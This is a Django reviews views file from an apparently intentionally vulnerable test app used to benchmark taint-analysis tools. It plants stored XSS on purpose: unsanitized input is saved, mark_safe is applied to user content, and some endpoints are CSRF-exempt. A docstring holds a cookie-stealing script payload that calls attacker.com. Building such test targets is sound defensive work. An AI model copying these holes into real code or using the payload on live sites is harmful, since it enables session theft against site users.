"""
Reviews Views

Contains intentionally vulnerable endpoints for taint analysis demonstration.

Vulnerabilities:
- V04: Stored XSS in add_review() and display
"""

from django.shortcuts import render, redirect, get_object_or_404
from django.http import JsonResponse, HttpResponse
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.utils.safestring import mark_safe
from django.views.decorators.csrf import csrf_exempt

from .models import Review, ReviewVote
from catalog.models import Product


@login_required
def add_review(request, product_id):
    """
    Add a product review.

    ==========================================================================
    VULNERABILITY V04: Stored XSS
    ==========================================================================
    CWE-79: Improper Neutralization of Input During Web Page Generation

    Taint Flow:
        Source: request.POST['comment']
        Storage: Database (Review model, comment field)
        Sink: Template rendering with mark_safe() or |safe filter

    Attack Vector:
        comment=<script>document.location='http://attacker.com/?c='+document.cookie</script>

    The malicious script is stored in the database and executed every time
    any user views the product page with this review.

    Expected Detection:
        - Pysa: UserControlled -> HtmlStorage -> HtmlOutput
        - CodeQL: py/stored-xss
        - Semgrep: python.django.security.stored-xss

    ==========================================================================
    """
    product = get_object_or_404(Product, id=product_id)

    if request.method == 'POST':
        rating = request.POST.get('rating', 5)
        title = request.POST.get('title', '')
        comment = request.POST.get('comment', '')

        # Check for existing review
        existing = Review.objects.filter(product=product, user=request.user).first()
        if existing:
            messages.error(request, 'You have already reviewed this product.')
            return redirect('catalog:product_detail', slug=product.slug)

        # =================================================================
        # VULNERABLE CODE - Stored XSS (V04)
        # =================================================================
        # SINK: User input stored in database without sanitization
        # The comment field can contain malicious HTML/JavaScript

        Review.objects.create(
            product=product,
            user=request.user,
            rating=int(rating),
            title=title,
            comment=comment,  # SINK: Unsanitized HTML stored
        )

        messages.success(request, 'Thank you for your review!')
        return redirect('catalog:product_detail', slug=product.slug)

    return render(request, 'reviews/review_form.html', {
        'product': product,
    })


def product_reviews(request, product_id):
    """
    Display all reviews for a product.

    VULNERABILITY V04: Stored XSS when rendering reviews
    """
    product = get_object_or_404(Product, id=product_id)
    reviews = Review.objects.filter(product=product, is_approved=True)

    # =================================================================
    # VULNERABLE CODE - Stored XSS (V04)
    # =================================================================
    # SINK: Using mark_safe() on user-controlled content
    # This allows stored XSS payloads to execute

    for review in reviews:
        # VULNERABLE: Marking user content as safe for HTML rendering
        review.comment_html = mark_safe(review.comment)  # SINK
        review.title_html = mark_safe(review.title)  # SINK

    return render(request, 'reviews/product_reviews.html', {
        'product': product,
        'reviews': reviews,
    })


@login_required
def edit_review(request, review_id):
    """Edit an existing review."""
    review = get_object_or_404(Review, id=review_id, user=request.user)

    if request.method == 'POST':
        rating = request.POST.get('rating', review.rating)
        title = request.POST.get('title', '')
        comment = request.POST.get('comment', '')

        review.rating = int(rating)
        review.title = title
        # VULNERABLE: Updated content also stored unsanitized
        review.comment = comment  # SINK
        review.save()

        messages.success(request, 'Review updated successfully.')
        return redirect('catalog:product_detail', slug=review.product.slug)

    return render(request, 'reviews/review_form.html', {
        'product': review.product,
        'review': review,
        'editing': True,
    })


@login_required
def delete_review(request, review_id):
    """Delete a review."""
    review = get_object_or_404(Review, id=review_id, user=request.user)
    product_slug = review.product.slug
    review.delete()
    messages.success(request, 'Review deleted.')
    return redirect('catalog:product_detail', slug=product_slug)


@csrf_exempt
@login_required
def vote_review(request, review_id):
    """Vote on whether a review is helpful."""
    if request.method != 'POST':
        return JsonResponse({'error': 'POST required'}, status=405)

    review = get_object_or_404(Review, id=review_id)
    is_helpful = request.POST.get('helpful', 'true').lower() == 'true'

    # Create or update vote
    vote, created = ReviewVote.objects.update_or_create(
        review=review,
        user=request.user,
        defaults={'is_helpful': is_helpful}
    )

    # Update helpful count on review
    review.helpful_votes = ReviewVote.objects.filter(
        review=review,
        is_helpful=True
    ).count()
    review.save()

    return JsonResponse({
        'success': True,
        'helpful_votes': review.helpful_votes
    })


def latest_reviews(request):
    """Display latest reviews across all products."""
    reviews = Review.objects.filter(is_approved=True).select_related('product', 'user')[:20]

    # VULNERABLE: Same mark_safe issue
    for review in reviews:
        review.comment_html = mark_safe(review.comment)  # SINK

    return render(request, 'reviews/latest_reviews.html', {
        'reviews': reviews,
    })


@csrf_exempt
def review_api(request, product_id):
    """
    API endpoint for reviews.

    VULNERABILITY V04: Returns unsanitized HTML in JSON response
    which may be rendered by frontend without escaping.
    """
    product = get_object_or_404(Product, id=product_id)

    if request.method == 'GET':
        reviews = Review.objects.filter(product=product, is_approved=True)
        data = [{
            'id': r.id,
            'user': r.user.username,
            'rating': r.rating,
            'title': r.title,  # May contain XSS
            'comment': r.comment,  # May contain XSS
            'created_at': r.created_at.isoformat(),
            'helpful_votes': r.helpful_votes,
        } for r in reviews]

        return JsonResponse({'reviews': data})

    elif request.method == 'POST':
        if not request.user.is_authenticated:
            return JsonResponse({'error': 'Authentication required'}, status=401)

        import json
        try:
            data = json.loads(request.body)
        except json.JSONDecodeError:
            return JsonResponse({'error': 'Invalid JSON'}, status=400)

        # VULNERABLE: No sanitization of input
        Review.objects.create(
            product=product,
            user=request.user,
            rating=data.get('rating', 5),
            title=data.get('title', ''),
            comment=data.get('comment', ''),  # SINK
        )

        return JsonResponse({'success': True})

    return JsonResponse({'error': 'Method not allowed'}, status=405)
